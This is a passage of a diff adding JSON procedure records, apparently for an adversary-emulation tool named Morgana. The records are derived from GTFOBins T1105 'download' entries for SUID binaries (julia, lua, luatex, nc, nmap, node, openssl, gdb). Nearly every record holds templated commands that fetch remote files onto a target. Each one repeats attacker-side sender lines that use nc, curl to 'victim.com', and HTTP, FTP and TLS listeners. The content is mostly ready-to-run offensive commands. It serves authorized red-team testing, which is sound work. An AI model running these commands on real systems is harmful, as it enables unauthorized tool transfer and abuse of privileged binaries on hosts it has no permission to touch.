+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server",
+          "inherited_from": "python",
+          "inheritance_path": [
+            "gdb",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gdb:download:0:suid:0:gdb>python",
+        "source_name": "gdb",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `gdb` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:julia:download:0:suid::",
+      "name": "GTFOBINS - T1105 - julia - Download - Suid [b48796a]",
+      "description": "This executable can download remote data. Binary: julia. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "julia -e 'download(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\", \"#{lotl_gtfobins_output_file}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/julia",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/julia",
+        "source_bin": "julia",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:julia:download:0:suid::",
+        "source_name": "julia",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `julia` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:lualatex:download:0:suid:0:lualatex>lua",
+      "name": "GTFOBINS - T1105 - lualatex - Download - Suid [b889880]",
+      "description": "This executable can download remote data. Binary: lualatex. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "lualatex -shell-escape '\\directlua{...}\\end'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/lualatex",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/lualatex",
+        "source_bin": "lualatex",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "lualatex",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "lualatex",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:lualatex:download:0:suid:0:lualatex>lua",
+        "source_name": "lualatex",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `lualatex` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:luatex:download:0:suid:0:luatex>lua",
+      "name": "GTFOBINS - T1105 - luatex - Download - Suid [fd7f774]",
+      "description": "This executable can download remote data. Binary: luatex. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "luatex -shell-escape '\\directlua{...}\\end'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/luatex",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/luatex",
+        "source_bin": "luatex",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "luatex",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "luatex",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:luatex:download:0:suid:0:luatex>lua",
+        "source_name": "luatex",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `luatex` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:lua:download:0:suid::",
+      "name": "GTFOBINS - T1105 - lua - Download - Suid [c5d74be]",
+      "description": "This executable can download remote data. Binary: lua. Context: SUID. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/lua",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/lua",
+        "source_bin": "lua",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client"
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:lua:download:0:suid::",
+        "source_name": "lua",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `lua` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nc:download:1:suid::",
+      "name": "GTFOBINS - T1105 - nc - Download - Suid [f723557]",
+      "description": "This executable can download remote data. Binary: nc. Context: SUID. The file is actually written by the invoking shell.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "nc #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port} >#{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nc",
+        "source_bin": "nc",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 1,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-server"
+        },
+        "operator_notes": {
+          "sender": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nc:download:1:suid::",
+        "source_name": "nc",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nc:download:0:suid::",
+      "name": "GTFOBINS - T1105 - nc - Download - Suid [16b3b35]",
+      "description": "This executable can download remote data. Binary: nc. Context: SUID. The file is actually written by the invoking shell.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "nc -l -p #{lotl_gtfobins_remote_port} >#{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nc",
+        "source_bin": "nc",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client"
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nc:download:0:suid::",
+        "source_name": "nc",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nmap:download:0:suid:0:nmap>lua",
+      "name": "GTFOBINS - T1105 - nmap - Download - Suid [9e0f742]",
+      "description": "This executable can download remote data. Binary: nmap. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\nnmap --script=#{lotl_gtfobins_local_path}\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nmap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nmap",
+        "source_bin": "nmap",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "nmap",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "nmap",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nmap:download:0:suid:0:nmap>lua",
+        "source_name": "nmap",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nmap` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:node:download:0:suid::",
+      "name": "GTFOBINS - T1105 - node - Download - Suid [3207cf8]",
+      "description": "This executable can download remote data. Binary: node. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "node -e 'require(\"http\").get(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\", res => res.pipe(require(\"fs\").createWriteStream(\"#{lotl_gtfobins_output_file}\")))'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/node",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/node",
+        "source_bin": "node",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:node:download:0:suid::",
+        "source_name": "node",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `node` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:openssl:download:0:suid::",
+      "name": "GTFOBINS - T1105 - openssl - Download - Suid [752bcd0]",
+      "description": "This executable can download remote data. Binary: openssl. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "openssl s_client -quiet -connect #{lotl_gtfobins_remote_host}:#{lotl_gtfobins_remote_port} >#{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/openssl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/openssl",
+        "source_bin": "openssl",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tls-server"
+        },
+        "operator_notes": {
+          "sender": "tls-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:openssl:download:0:suid::",
+        "source_name": "openssl",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `openssl` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pandoc:download:0:suid:0:pandoc>lua",
+      "name": "GTFOBINS - T1105 - pandoc - Download - Suid [4653327]",
+      "description": "This executable can download remote data. Binary: pandoc. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
